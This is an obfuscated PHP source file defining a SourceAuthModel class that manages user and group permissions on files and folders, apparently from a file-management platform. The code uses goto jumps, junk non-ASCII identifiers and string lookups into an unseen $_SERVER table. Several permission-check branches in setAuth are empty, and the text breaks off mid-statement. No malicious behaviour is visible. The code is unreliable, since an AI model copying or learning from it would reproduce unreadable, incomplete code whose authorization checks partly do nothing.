<?php
 goto cµ«š±…ùÓ; aÈÅ™Ş¾‹›: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\162\143\145\x5f\x61\165\x74\x68"; public function getAuth($CÛßìà©ƒ‚) { goto F†Œ•¡ß´—; F†Œ•¡ß´—: $c¨“ÅÅÏ„Ú =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fŠˆšÈİÛ = $this->sourceAuthSelect($CÛßìà©ƒ‚); $D¾ŠÑí‹„ = array(); goto FŞäÈ±‘ÚŞ; FŞäÈ±‘ÚŞ: $Döàİ ôéÉ = array(); $dÖ´õãïİ = 2 << 25; foreach ($fŠˆšÈİÛ as $FİáˆÛø¹) { goto A‚À Ø«¦­; fæÙÈèš®Á: if ($FİáˆÛø¹[$c¨“ÅÅÏ„Ú[407]] == SourceModel::TYPE_USER && $FİáˆÛø¹[$c¨“ÅÅÏ„Ú[487]] == $c¨“ÅÅÏ„Ú[500]) { $bùÚã¾öã­ = 0; } $Döàİ ôéÉ[] = $eÎÁØ°òÊÂ[$c¨“ÅÅÏ„Ú[409]] + $bùÚã¾öã­; goto bÆ¡œ°‘Ä‡; A‚À Ø«¦­: $eÎÁØ°òÊÂ = Model($c¨“ÅÅÏ„Ú[1818])->listData($FİáˆÛø¹[$c¨“ÅÅÏ„Ú[1746]]); if (!$eÎÁØ°òÊÂ) { continue; } $D¾ŠÑí‹„[] = $FİáˆÛø¹; goto C µ‡…Îæ; C µ‡…Îæ: $bùÚã¾öã­ = 0; if ($FİáˆÛø¹[$c¨“ÅÅÏ„Ú[407]] == SourceModel::TYPE_GROUP) { $bùÚã¾öã­ = $dÖ´õãïİ * 2; } if ($FİáˆÛø¹[$c¨“ÅÅÏ„Ú[407]] == SourceModel::TYPE_USER) { $bùÚã¾öã­ = $dÖ´õãïİ; } goto fæÙÈèš®Á; bÆ¡œ°‘Ä‡: } goto c¹É³æ²ËĞ; c¹É³æ²ËĞ: array_multisort($Döàİ ôéÉ, SORT_DESC, $D¾ŠÑí‹„); return $D¾ŠÑí‹„; goto bàçÄÎö¬±; bàçÄÎö¬±: } public function sourceAuthSelect($döğøª¸¡è) { goto bÅè§Ïªğ²; C‹›À¹‰İ: if ($D˜ËØùò) { $döğøª¸¡è = array($döğøª¸¡è); } $f“‡Ëí›Äˆ = array(); foreach ($döğøª¸¡è as $añö›„Û») { if (isset($A…Š¦½«Ïù[$añö›„Û»])) { $f“‡Ëí›Äˆ[$añö›„Û»] = $A…Š¦½«Ïù[$añö›„Û»]; } } goto A”ù›ãÏ ê; AŠ®‡¿„©: if ($D˜ËØùò) { return $DÃ»ÑòÄ‰Â; } return $EˆÂî‡»Ù¹; goto A‰‚Ò«îİ; A”ù›ãÏ ê: if (count($f“‡Ëí›Äˆ) == count($döğøª¸¡è)) { return $D˜ËØùò ? $f“‡Ëí›Äˆ[$döğøª¸¡è[0]] : $f“‡Ëí›Äˆ; } $B×ªÚÊ«ª­ = $Bµ²±¨‹î[1819]; $dÎø²–¿àŸ = array($Bµ²±¨‹î[399] => array($Bµ²±¨‹î[7], $döğøª¸¡è)); goto D¿ØÛª‰‰ö; D¿ØÛª‰‰ö: $DÃ»ÑòÄ‰Â = $this->field($B×ªÚÊ«ª­)->order($Bµ²±¨‹î[397])->where($dÎø²–¿àŸ)->select(); $EˆÂî‡»Ù¹ = array_to_keyvalue_group($DÃ»ÑòÄ‰Â, $Bµ²±¨‹î[399]); foreach ($döğøª¸¡è as $añö›„Û») { $A…Š¦½«Ïù[$añö›„Û»] = $EˆÂî‡»Ù¹[$añö›„Û»] ? $EˆÂî‡»Ù¹[$añö›„Û»] : array(); } goto AŠ®‡¿„©; bÅè§Ïªğ²: $Bµ²±¨‹î =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $A…Š¦½«Ïù = array(); $D˜ËØùò = is_array($döğøª¸¡è) ? !1 : !0; goto C‹›À¹‰İ; A‰‚Ò«îİ: } public function setAuth($b‡¢Ø¾İ§†, $eÛéîÓÌ¡) { goto eá¬œ¤ë›ˆ; c‰º²´´™: foreach ($eÛéîÓÌ¡ as $fƒë†Û«†Ì) { if (!in_array($fƒë†Û«†Ì[$EƒİÄ™ôÑ”[407]], $eµŠÛ›©·Î)) { show_json(LNG($EƒİÄ™ôÑ”[1820]), !1); } if ($E––ò‚øÂ != $dŠÀ„ù¹íÏ) { if ($fƒë†Û«†Ì[$EƒİÄ™ôÑ”[407]] == SourceModel::TYPE_GROUP) { } if ($fƒë†Û«†Ì[$EƒİÄ™ôÑ”[487]] != 0 && !in_array($fƒë†Û«†Ì[$EƒİÄ™ôÑ”[487]], $có·°åĞ¿¤)) { } } if ($fƒë†Û«†Ì[$EƒİÄ™ôÑ”[487]] == 0) { $fƒë†Û«†Ì[$EƒİÄ™ôÑ”[407]] = SourceModel::TYPE_USER; } $cÔã¹‰ºÈ[] = array($EƒİÄ™ôÑ”[399] => $b‡¢Ø¾İ§†, $EƒİÄ™ôÑ”[407] => intval($fƒë†Û«†Ì[$EƒİÄ™ôÑ”[407]]), $EƒİÄ™ôÑ”[487] => intval($fƒë†Û«†Ì[$EƒİÄ™ôÑ”[487]]), $EƒİÄ™ôÑ”[1746] => intval($fƒë†Û«†Ì[$EƒİÄ™ôÑ”[1746]]) ? intval($fƒë†Û«†Ì[$EƒİÄ™ôÑ”[1746]]) : 0, $EƒİÄ™ôÑ”[1800] => intval($fƒë†Û«†Ì[$EƒİÄ™ôÑ”[1800]]) ? intval($fƒë†Û«†Ì[$EƒİÄ™ôÑ”[1800]]) : -1); } $this->where(array($EƒİÄ™ôÑ”[413] => $b‡¢Ø¾İ§†))->delete(); $this->addAll($cÔã¹‰ºÈ); goto fÕ£ø“Æ’…; d…‹ŠçØ˜: if ($DÏ†äá”Ö[$EƒİÄ™ôÑ”[407]] != SourceModel::TYPE_GROUP) { return !1; } $dŠÀ„ù¹íÏ = 1; $E––ò‚øÂ = $DÏ†äá”Ö[$EƒİÄ™ôÑ”[487]]; goto e ÓÑº‚Àæ; e ÓÑº‚Àæ: if ($E––ò‚øÂ != $dŠÀ„ù¹íÏ) { $fã²à¦ù˜ = array($EƒİÄ™ôÑ”[1650] => $E––ò‚øÂ); $có·°åĞ¿¤ = Model($EƒİÄ™ôÑ”[1732])->field($EƒİÄ™ôÑ”[1487])->where($fã²à¦ù˜)->select(); $có·°åĞ¿¤ = array_to_keyvalue($có·°åĞ¿¤, $EƒİÄ™ôÑ”[33], $EƒİÄ™ôÑ”[1487]); } $eµŠÛ›©·Î = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $cÔã¹‰ºÈ = array(); goto c‰º²´´™; eá¬œ¤ë›ˆ: $EƒİÄ™ôÑ” =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DÏ†äá”Ö = Model($EƒİÄ™ôÑ”[1164])->sourceInfo($b‡¢Ø¾İ§†); if (!$DÏ†äá”Ö) { return !1; } goto d…‹ŠçØ˜; fÕ£ø“Æ’…: return !0; goto B­‡„‰Ç; B­‡„‰Ç: } public function authClear($cáÊ¡Ì¨ù) { $aªÅ¤ËÚ“ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AÌÅ¸Ø†øÃ = Model($aªÅ¤ËÚ“[1164])->sourceInfo($cáÊ¡Ì¨ù); $FŸ¯µ†ä› = array($cáÊ¡Ì¨ù); if ($AÌÅ¸Ø†øÃ[$aªÅ¤ËÚ“[406]] == $aªÅ¤ËÚ“[96]) { $a¢ê•«‰ Ø = array($aªÅ¤ËÚ“[557] => array($aªÅ¤ËÚ“[516], $AÌÅ¸Ø†øÃ[$aªÅ¤ËÚ“[490]] . $cáÊ¡Ì¨ù . $aªÅ¤ËÚ“[517])); $FŸ¯µ†ä› = Model($aªÅ¤ËÚ“[1164])->field($aªÅ¤ËÚ“[413])->where($a¢ê•«‰ Ø)->getField($aªÅ¤ËÚ“[399], !0); $FŸ¯µ†ä›[] = $cáÊ¡Ì¨ù; } $this->where(array($aªÅ¤ËÚ“[413] => array($aªÅ¤ËÚ“[414], $FŸ¯µ†ä›)))->delete(); return !0; } public function getAllChildren($b¬àò¢¸ÛÍ) { goto c‰¦ªˆ‰ßÁ; F ÌîÓ–Úô: $C³‡°•İ–¶ = Model($aó¦²ŠõÌ[759])->field($f„ÃÖº³ØÅ)->where($B³¹âÄ±)->select(); $Dóè’‚×ƒè = array($b¬àò¢¸ÛÍ); foreach ($C³‡°•İ–¶ as $a½¶‘‰„‰Ï) { foreach ($e½œ¤—×š as $FÕŒŠ××Ó¬) { $Eíâ£°Ÿß¶ = $aó¦²ŠõÌ[47] . $FÕŒŠ××Ó¬ . $aó¦²ŠõÌ[47]; $c¡³ê’ÙŒ¢ = $a½¶‘‰„‰Ï[$aó¦²ŠõÌ[490]] . $a½¶‘‰„‰Ï[$aó¦²ŠõÌ[399]] . $aó¦²ŠõÌ[47]; if (strstr($c¡³ê’ÙŒ¢, $Eíâ£°Ÿß¶)) { $Dóè’‚×ƒè[] = $a½¶‘‰„‰Ï[$aó¦²ŠõÌ[399]]; break; } } } goto AĞš£äÅÎ´; c‰¦ªˆ‰ßÁ: $aó¦²ŠõÌ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C–áó—‰Á = Model($aó¦²ŠõÌ[1164])->sourceInfo($b¬àò¢¸ÛÍ); if ($C–áó—‰Á[$aó¦²ŠõÌ[406]] != $aó¦²ŠõÌ[96]) { return $this->sourceListAuth(array($b¬àò¢¸ÛÍ)); } goto eÇÔó­’ë­; A•£à„ä­: if ($C–áó—‰Á[$aó¦²ŠõÌ[481]] == $aó¦²ŠõÌ[500] && $C–áó—‰Á[$aó¦²ŠõÌ[487]] != $d©Û¦Çøã¸) { $e½œ¤—×š = $this->groupChidldAllRootSource($C–áó—‰Á[$aó¦²ŠõÌ[487]]); } $aù¸Ëâí‚† = $this->field($aó¦²ŠõÌ[399])->group($aó¦²ŠõÌ[399])->select(); $aù¸Ëâí‚† = array_to_keyvalue($aù¸Ëâí‚†, $aó¦²ŠõÌ[33], $aó¦²ŠõÌ[399]); goto C¾í‘ã§§Ï; eÇÔó­’ë­: if ($C–áó—‰Á[$aó¦²ŠõÌ[407]] != SourceModel::TYPE_GROUP) { return array(); } $d©Û¦Çøã¸ = 1; $e½œ¤—×š = array($b¬àò¢¸ÛÍ); goto A•£à„ä­; AĞš£äÅÎ´: return $this->sourceListAuth($Dóè’‚×ƒè); goto d´½§¡—ø­; C¾í‘ã§§Ï: if (!$aù¸Ëâí‚†) { return array(); } $f„ÃÖº³ØÅ = $aó¦²ŠõÌ[1821]; $B³¹âÄ± = array($aó¦²ŠõÌ[399] => array($aó¦²ŠõÌ[7], $aù¸Ëâí‚†), $aó¦²ŠõÌ[426] => $aó¦²ŠõÌ[500]); goto F ÌîÓ–Úô; d´½§¡—ø­: } private function sourceListAuth($E®‰ÕÚ†ˆ) { goto c¾É©Ë…Ò¿; a—òò‰©‰ƒ: array_multisort($eŞö¿‹Á, SORT_ASC, $Añæ‰Û±òÀ); return $Añæ‰Û±òÀ; goto f®ÒÒ›Ûõ½; B³ÎÚ›†§ó: $Añæ‰Û±òÀ = array(); $eŞö¿‹Á = array(); foreach ($aŒ©šê’â as $A¢ §„ª§) { goto AŠÄ¨“‚É´; E…ì„¢ÏÔñ: $A¢ §„ª§[$d—¼°Ò‡•“[1822]] = $this->authTargetInfo($d¤–°±ß¾®); $A¢ §„ª§[$d—¼°Ò‡•“[498]] = rtrim($A¢ §„ª§[$d—¼°Ò‡•“[493]], $d—¼°Ò‡•“[8]) . $d—¼°Ò‡•“[8] . ltrim($A¢ §„ª§[$d—¼°Ò‡•“[498]], $d—¼°Ò‡•“[8]); $Añæ‰Û±òÀ[] = $A¢ §„ª§; goto DšË”×Õò; DšË”×Õò: $Aë¬È›Á‰¹ = count(explode($d—¼°Ò‡•“[8], trim($A¢ §„ª§[$d—¼°Ò‡•“[498]], $d—¼°Ò‡•“[8]))); $eŞö¿‹Á[] = $Aë¬È›Á‰¹ + ($A¢ §„ª§[$d—¼°Ò‡•“[29]] == $d—¼°Ò‡•“[86] ? 0 : 1000); goto fàäå²…¤; AŠÄ¨“‚É´: unset($A¢ §„ª§[$d—¼°Ò‡•“[437]]); unset($A¢ §„ª§[$d—¼°Ò‡•“[435]]); unset($A¢ §„ª§[$d—¼°Ò‡•“[409]]); goto dÛ­‘ñä””; dÛ­‘ñä””: unset($A¢ §„ª§[$d—¼°Ò‡•“[94]]); $d¤–°±ß¾® = $b˜ææÇå”Ó[$A¢ §„ª§[$d—¼°Ò‡•“[399]]]; if (!$d¤–°±ß¾®) { continue; } goto E…ì„¢ÏÔñ; fàäå²…¤: } goto a—òò‰©‰ƒ; c¾É©Ë…Ò¿: $d—¼°Ò‡•“ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aŒ©šê’â = Model($d—¼°Ò‡•“[1164])->sourceListInfo($E®‰ÕÚ†ˆ, !0); $b˜ææÇå”Ó = $this->sourceAuthSelect($E®‰ÕÚ†ˆ); goto B³ÎÚ›†§ó; f®ÒÒ›Ûõ½: } private function groupChidldAllRootSource($b©‰İàÛ) { $C“§Ö‰¬Š‘ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cµè‘˜Ã = Model($C“§Ö‰¬Š‘[1823])->groupChildrenAll($b©‰İàÛ); $cå«¹š†ù = array($C“§Ö‰¬Š‘[481] => 0, $C“§Ö‰¬Š‘[487] => array($C“§Ö‰¬Š‘[7], $cµè‘˜Ã), $C“§Ö‰¬Š‘[407] => SourceModel::TYPE_GROUP); $D¾‘İ™‰Œ· = Model($C“§Ö‰¬Š‘[759])->field($C“§Ö‰¬Š‘[399])->where($cå«¹š†ù)->select(); $D¾‘İ™‰Œ· = array_to_keyvalue($D¾‘İ™‰Œ·, $C“§Ö‰¬Š‘[33], $C“§Ö‰¬Š‘[399]); return $D¾‘İ™‰Œ·; } private function authTargetInfo($F“…öºÂİà) { goto Fª³É••Ô ; BÉÛº…†®Š: return $FôÛˆ²Ì–; goto DŞóÛ‘Â«; Fª³É••Ô : $a¡É÷ô‘˜ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FôÛˆ²Ì– = array(); $a›ççò¶± = array(); goto F®ÈÂÑá¨à; F®ÈÂÑá¨à: $BŸ½ö¨Ë¼á = 2 << 25; foreach ($F“…öºÂİà as $EÖÀ¼Ú¥Œ) { goto aØ­ÖĞˆ¢‚; aš ŒĞÄ: if ($EÖÀ¼Ú¥Œ[$a¡É÷ô‘˜[407]] == SourceModel::TYPE_USER && $EÖÀ¼Ú¥Œ[$a¡É÷ô‘˜[487]] == $a¡É÷ô‘˜[500]) { $EˆÄñŒÚêÁ = 0; } $a›ççò¶±[] = $B›İÊ¾º³[$a¡É÷ô‘˜[409]] + $EˆÄñŒÚêÁ; goto f–ÕŞ™Ã; c™‰èñĞƒâ: if (!$aÎé«¡»±™) { continue; } $aÎé«¡»±™[$a¡É÷ô‘˜[449]] = $B›İÊ¾º³; $FôÛˆ²Ì–[] = $aÎé«¡»±™; goto E”ïéÇ†®Î; E”ïéÇ†®Î: $EˆÄñŒÚêÁ = 0; if ($EÖÀ¼Ú¥Œ[$a¡É÷ô‘˜[407]] == SourceModel::TYPE_GROUP) { $EˆÄñŒÚêÁ = $BŸ½ö¨Ë¼á * 2; } if ($EÖÀ¼Ú¥Œ[$a¡É÷ô‘˜[407]] == SourceModel::TYPE_USER) { $EˆÄñŒÚêÁ = $BŸ½ö¨Ë¼á; } goto aš ŒĞÄ; aØ­ÖĞˆ¢‚: $B›İÊ¾º³ = Model($a¡É÷ô‘˜[1818])->listData($EÖÀ¼Ú¥Œ[$a¡É÷ô‘˜[1746]]); if (!$B›İÊ¾º³) { continue; } if ($EÖÀ¼Ú¥Œ[$a¡É÷ô‘˜[407]] == SourceModel::TYPE_USER) { $aÎé«¡»±™ = Model($a¡É÷ô‘˜[506])->getInfoSimpleOuter($EÖÀ¼Ú¥Œ[$a¡É÷ô‘˜[487]]); if ($aÎé«¡»±™[$a¡É÷ô‘˜[1487]] == $a¡É÷ô‘˜[1045]) { continue; } if ($aÎé«¡»±™[$a¡É÷ô‘˜[1487]] == $a¡É÷ô‘˜[500]) { $aÎé«¡»±™[$a¡É÷ô‘˜[28]] = LNG($a¡É÷ô‘˜[1824]); } } else { $aÎé«¡»±™ = Model($a¡É÷ô‘˜[489])->getInfoSimple($EÖÀ¼Ú¥Œ[$a¡É÷ô‘˜[487]]); } goto c™‰èñĞƒâ; f–ÕŞ™Ã: } array_multisort($a›ççò¶±, SORT_DESC, $FôÛˆ²Ì–); goto BÉÛº…†®Š; DŞóÛ‘Â«: } public function getAllChildrenByUser($BºÇÄÃ, $DÈòÂÎéª­) { goto A†ììêğ„; DÜ›Ì­›Å¯: if ($D¡ØïÁÁÌ[$fõ¨—Ú®Ã[481]] == $fõ¨—Ú®Ã[500] && $D¡ØïÁÁÌ[$fõ¨—Ú®Ã[487]] != $fèÕ›ÛÉ¼× && $this->groupContainUser($D¡ØïÁÁÌ[$fõ¨—Ú®Ã[487]], $DÈòÂÎéª­)) { foreach ($AØŒ£©Â¼Ï[$fõ¨—Ú®Ã[1825]] as $fç„Ûë‡Ìµ) { $eé¾‚ŒÜ = Model($fõ¨—Ú®Ã[489])->getInfo($fç„Ûë‡Ìµ[$fõ¨—Ú®Ã[1650]]); $e›ÓèçÛ£¨ = Model($fõ¨—Ú®Ã[510])->getInfoSimpleOuter($DÈòÂÎéª­); $e›ÓèçÛ£¨[$fõ¨—Ú®Ã[449]] = $fç„Ûë‡Ìµ[$fõ¨—Ú®Ã[409]]; if (Model($fõ¨—Ú®Ã[1818])->authCheckAction($fç„Ûë‡Ìµ[$fõ¨—Ú®Ã[409]][$fõ¨—Ú®Ã[409]], $fõ¨—Ú®Ã[1670])) { continue; } $Fõ•µïÛõ = array($fõ¨—Ú®Ã[28] => $fõ¨—Ú®Ã[1440] . $eé¾‚ŒÜ[$fõ¨—Ú®Ã[28]], $fõ¨—Ú®Ã[399] => $eé¾‚ŒÜ[$fõ¨—Ú®Ã[94]][$fõ¨—Ú®Ã[399]], $fõ¨—Ú®Ã[85] => KodIO::make($eé¾‚ŒÜ[$fõ¨—Ú®Ã[94]][$fõ¨—Ú®Ã[399]]), $fõ¨—Ú®Ã[481] => $fõ¨—Ú®Ã[500], $fõ¨—Ú®Ã[407] => $fõ¨—Ú®Ã[976], $fõ¨—Ú®Ã[29] => $fõ¨—Ú®Ã[521], $fõ¨—Ú®Ã[498] => $eé¾‚ŒÜ[$fõ¨—Ú®Ã[494]], $fõ¨—Ú®Ã[1650] => $eé¾‚ŒÜ[$fõ¨—Ú®Ã[1650]], $fõ¨—Ú®Ã[491] => $eé¾‚ŒÜ[$fõ¨—Ú®Ã[481]], $fõ¨—Ú®Ã[1822] => array($e›ÓèçÛ£¨)); $Eí°çÖË¶¶[$Fõ•µïÛõ[$fõ¨—Ú®Ã[399]]] = $Fõ•µïÛõ; } } $bø‡Ş¥ìÕˆ = array(); $a§¡…›Ôãº = $this->getAllChildren($BºÇÄÃ); goto a¥ìŒ¡Î ‰; eÅ”²‹ˆÆ‰: $D¡ØïÁÁÌ = Model($fõ¨—Ú®Ã[1164])->sourceInfo($BºÇÄÃ); $Eí°çÖË¶¶ = array(); $fèÕ›ÛÉ¼× = 1; goto DÜ›Ì­›Å¯; A¨ĞàëÓš¥: return $bø‡Ş¥ìÕˆ; goto e¾½‡—„íÏ; A†ììêğ„: $fõ¨—Ú®Ã =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AØŒ£©Â¼Ï = Model($fõ¨—Ú®Ã[510])->getInfo($DÈòÂÎéª­); if (!$DÈòÂÎéª­ || !$BºÇÄÃ || !$AØŒ£©Â¼Ï) { return array(); } goto eÅ”²‹ˆÆ‰; a¥ìŒ¡Î ‰: foreach ($a§¡…›Ôãº as $BÏÚí‹Òé‹) { $bœÏ•à˜Å = !1; foreach ($BÏÚí‹Òé‹[$fõ¨—Ú®Ã[1822]] as $d†ÉÈËÄÒ) { if ($d†ÉÈËÄÒ[$fõ¨—Ú®Ã[1487]]) { if ($d†ÉÈËÄÒ[$fõ¨—Ú®Ã[1487]] == $DÈòÂÎéª­) { $bœÏ•à˜Å = !0; break; } } if ($d†ÉÈËÄÒ[$fõ¨—Ú®Ã[1650]]) { if ($this->groupContainUser($d†ÉÈËÄÒ[$fõ¨—Ú®Ã[1650]], $DÈòÂÎéª­)) { $bœÏ•à˜Å = !0; break; } } } if ($bœÏ•à˜Å) { $bø‡Ş¥ìÕˆ[] = $BÏÚí‹Òé‹; } $Fï÷—¦é›Ğ = $BÏÚí‹Òé‹[$fõ¨—Ú®Ã[399]]; if (isset($Eí°çÖË¶¶[$Fï÷—¦é›Ğ])) { $BÏÚí‹Òé‹[$fõ¨—Ú®Ã[1822]][] = $Eí°çÖË¶¶[$Fï÷—¦é›Ğ][0]; $Eí°çÖË¶¶[$Fï÷—¦é›Ğ] = !1; } } $Eí°çÖË¶¶ = array_filter(array_values($Eí°çÖË¶¶)); $bø‡Ş¥ìÕˆ = array_merge($Eí°çÖË¶¶, $bø‡Ş¥ìÕˆ); goto A¨ĞàëÓš¥; e¾½‡—„íÏ: } public function setAllChildrenByUser($e‡Ú¥‰ÛÍÅ, $bªØ‹˜È¼ğ, $e¨ÕÏŠ˜–Ï) { $A«“µºŠÁë =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AôšèË»ø = $this->getAllChildrenByUser($e‡Ú¥‰ÛÍÅ, $bªØ‹˜È¼ğ); if (!$e¨ÕÏŠ˜–Ï || !$AôšèË»ø) { return !1; } foreach ($AôšèË»ø as $f¯ìâ™˜¿) { $aê’¶®øÔ¢ = array(); foreach ($f¯ìâ™˜¿[$A«“µºŠÁë[1822]] as $Aã›¸í‡Åì) { $bÒêñ”á¦™ = $Aã›¸í‡Åì[$A«“µºŠÁë[449]]; $BƒßŠÁ„’´ = $Aã›¸í‡Åì[$A«“µºŠÁë[1487]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $B­ï¤Š‚ = $Aã›¸í‡Åì[$A«“µºŠÁë[1487]] ? $Aã›¸í‡Åì[$A«“µºŠÁë[1487]] : $Aã›¸í‡Åì[$A«“µºŠÁë[1650]]; if ($Aã›¸í‡Åì[$A«“µºŠÁë[1487]] && $Aã›¸í‡Åì[$A«“µºŠÁë[1487]] == $bªØ‹˜È¼ğ) { continue; } $aê’¶®øÔ¢[] = array($A«“µºŠÁë[399] => $f¯ìâ™˜¿[$A«“µºŠÁë[399]], $A«“µºŠÁë[407] => $BƒßŠÁ„’´, $A«“µºŠÁë[487] => intval($B­ï¤Š‚), $A«“µºŠÁë[1746] => isset($bÒêñ”á¦™[$A«“µºŠÁë[397]]) ? intval($bÒêñ”á¦™[$A«“µºŠÁë[397]]) : 0, $A«“µºŠÁë[1800] => isset($bÒêñ”á¦™[$A«“µºŠÁë[1800]]) ? intval($bÒêñ”á¦™[$A«“µºŠÁë[1800]]) : -1); } $aê’¶®øÔ¢[] = array($A«“µºŠÁë[399] => $f¯ìâ™˜¿[$A«“µºŠÁë[399]], $A«“µºŠÁë[407] => SourceModel::TYPE_USER, $A«“µºŠÁë[487] => intval($bªØ‹˜È¼ğ), $A«“µºŠÁë[1746] => intval($e¨ÕÏŠ˜–Ï), $A«“µºŠÁë[1800] => -1); $this->where(array($A«“µºŠÁë[413] => $f¯ìâ™˜¿[$A«“µºŠÁë[399]]))->delete(); $this->addAll($aê’¶®øÔ¢); } return !0; } public function get($a’§¼á˜Ò) { $fóø‡Ó¿³ = $this->getSourceList(array($a’§¼á˜Ò), !0); return $fóø‡Ó¿³[0]; } public function getSourceList($Bœæšœ…ëæ, $dÏ˜Ç“† = false, $BöËàÒ‡¿£ = false) { goto a·¡¦ã“áê; e›‚„Îã‡À: $BÖ¨Ñˆ‹µ = $this->userIsRoot($BöËàÒ‡¿£); $Aš’ù©·ƒ´ = AuthModel::authAll(); $AøïÄÂÌ¿× = array($BÅ´Õ¹ã§Ê[410] => $Aš’ù©·ƒ´, $BÅ´Õ¹ã§Ê[1827] => array($BÅ´Õ¹ã§Ê[415] => 0, $BÅ´Õ¹ã§Ê[1656] => $Aš’ù©·ƒ´, $BÅ´Õ¹ã§Ê[416] => LNG($BÅ´Õ¹ã§Ê[1828]), $BÅ´Õ¹ã§Ê[1671] => $BÅ´Õ¹ã§Ê[1829])); goto a…³â»İØ; a·¡¦ã“áê: $BÅ´Õ¹ã§Ê =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$Bœæšœ…ëæ) { return array(); } $AŞ²ñº³÷® = Model($BÅ´Õ¹ã§Ê[1164]); goto BÛµøäèòÆ; BÛµøäèòÆ: if (!$dÏ˜Ç“† && count($Bœæšœ…ëæ) == 1) { $dÏ˜Ç“† = array(); $dÏ˜Ç“†[$Bœæšœ…ëæ[0]] = $AŞ²ñº³÷®->sourceInfo($Bœæšœ…ëæ[0]); } if (!$dÏ˜Ç“†) { $aõº”­³ï = array($BÅ´Õ¹ã§Ê[413] => array($BÅ´Õ¹ã§Ê[414], $Bœæšœ…ëæ)); $dÏ˜Ç“† = $AŞ²ñº³÷®->field($BÅ´Õ¹ã§Ê[1826])->where($aõº”­³ï)->select(); $dÏ˜Ç“† = array_to_keyvalue($dÏ˜Ç“†, $BÅ´Õ¹ã§Ê[399]); } $FÖ÷œóğá† = $Bœæšœ…ëæ; goto Fï‰ˆÓÚ‘œ; E½¦¼é¦ä: $aÍˆåòÍé = $this->sourceAuthSelect($FÖ÷œóğá†); $BÙ®°ö»¾× = array(); foreach ($FÖ÷œóğá† as $F¦÷„š²) { if (isset($aÍˆåòÍé[$F¦÷„š²])) { $BÙ®°ö»¾×[$F¦÷„š²] = $aÍˆåòÍé[$F¦÷„š²]; } } goto e›‚„Îã‡À; Fï‰ˆÓÚ‘œ: foreach ($dÏ˜Ç“† as $b®ÅŞìÚ¤ => $E³±ÉĞÊŸø) { $EŒ†ÓÀò¨š = $AŞ²ñº³÷®->parentLevelArray($E³±ÉĞÊŸø[$BÅ´Õ¹ã§Ê[490]]); $FÖ÷œóğá† = array_merge($FÖ÷œóğá†, array($b®ÅŞìÚ¤), array_reverse($EŒ†ÓÀò¨š)); } $FÖ÷œóğá† = array_values(array_unique($FÖ÷œóğá†)); if (!$FÖ÷œóğá†) { return array(); } goto E½¦¼é¦ä; a…³â»İØ: $f˜ê›ùÊ‰ = array(); foreach ($dÏ˜Ç“† as $F¦÷„š² => $d¹«Õ›ùùñ) { if ($BÖ¨Ñˆ‹µ) { $f˜ê›ùÊ‰[$F¦÷„š²] = $AøïÄÂÌ¿×; continue; } $f˜ê›ùÊ‰[$F¦÷„š²] = $this->makeSourceAuth($d¹«Õ›ùùñ, $BÙ®°ö»¾×, $BöËàÒ‡¿£); } return $f˜ê›ùÊ‰; goto aâ—ªÍ«¿Ú; aâ—ªÍ«¿Ú: } public function authDeepCheck($D°¼Çæ…º©, $DÙ¶¹Éšì™ = false) { goto b²‹Ä—æºæ; DàÏêÆîËæ: if (!$bššÕˆ¢ì¶) { return !1; } $A¹¾˜ê—ù¶ = $bššÕˆ¢ì¶ ? $bššÕˆ¢ì¶[0] : $D°¼Çæ…º©; return array($Dîª‘ß……¬[410] => -1, $Dîª‘ß……¬[449] => array($Dîª‘ß……¬[415] => $Dîª‘ß……¬[1045], $Dîª‘ß……¬[1656] => $Dîª‘ß……¬[500], $Dîª‘ß……¬[416] => LNG($Dîª‘ß……¬[1832]), $Dîª‘ß……¬[1671] => $Dîª‘ß……¬[1833]), $Dîª‘ß……¬[1834] => LNG($Dîª‘ß……¬[1835]), $Dîª‘ß……¬[1836] => $this->sourceAuthInfo($A¹¾˜ê—ù¶)); goto Fˆ‚°Ù„Ü·; c–Š¹À˜¦°: if (!in_array($D°¼Çæ…º©, $bŞº ¼¨‘°[$Dîª‘ß……¬[1830]])) { return !1; } $bššÕˆ¢ì¶ = array(); foreach ($bŞº ¼¨‘°[$Dîª‘ß……¬[1831]] as $Eºâˆ©ë‘ó => $B°§‚Şç˜ç) { if (!in_array($D°¼Çæ…º©, $B°§‚Şç˜ç)) { continue; } $bššÕˆ¢ì¶[] = $Eºâˆ©ë‘ó; } goto DàÏêÆîËæ; b²‹Ä—æºæ: $Dîª‘ß……¬ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DÙ¶¹Éšì™ = $DÙ¶¹Éšì™ ? $DÙ¶¹Éšì™ : USER_ID; $bŞº ¼¨‘° = $this->makeAuthDeep($DÙ¶¹Éšì™); goto c–Š¹À˜¦°; Fˆ‚°Ù„Ü·: } protected function makeAuthDeep($FìËö‘Ğ = false) { goto cÅ×‘•†‹; aé„ß‘ˆÚá: if ($d‡‘‹Ÿô±½) { $Aé¿í£×£ = array(array($AİÔÀ´½ïî[407] => SourceModel::TYPE_USER, $AİÔÀ´½ïî[487] => $FìËö‘Ğ), array($AİÔÀ´½ïî[407] => SourceModel::TYPE_GROUP, $AİÔÀ´½ïî[487] => array($AİÔÀ´½ïî[414], $d‡‘‹Ÿô±½)), $AİÔÀ´½ïî[918] => $AİÔÀ´½ïî[1738]); } $E‹©Şˆ›¹ = $this->field($AİÔÀ´½ïî[1838])->where($Aé¿í£×£)->select(); $e™³Î˜¿ÉÒ = array(); goto cô¹‹ÊÈ§; cô¹‹ÊÈ§: $DÜÒà¬è¤ğ = array_to_keyvalue_group($E‹©Şˆ›¹, $AİÔÀ´½ïî[399]); foreach ($DÜÒà¬è¤ğ as $bø±µÈ˜Ï => $CÏÑÓ°ÆÚƒ) { $CÃ‘¬º©¹ = $this->authArrayCheck($CÏÑÓ°ÆÚƒ, $FìËö‘Ğ); if 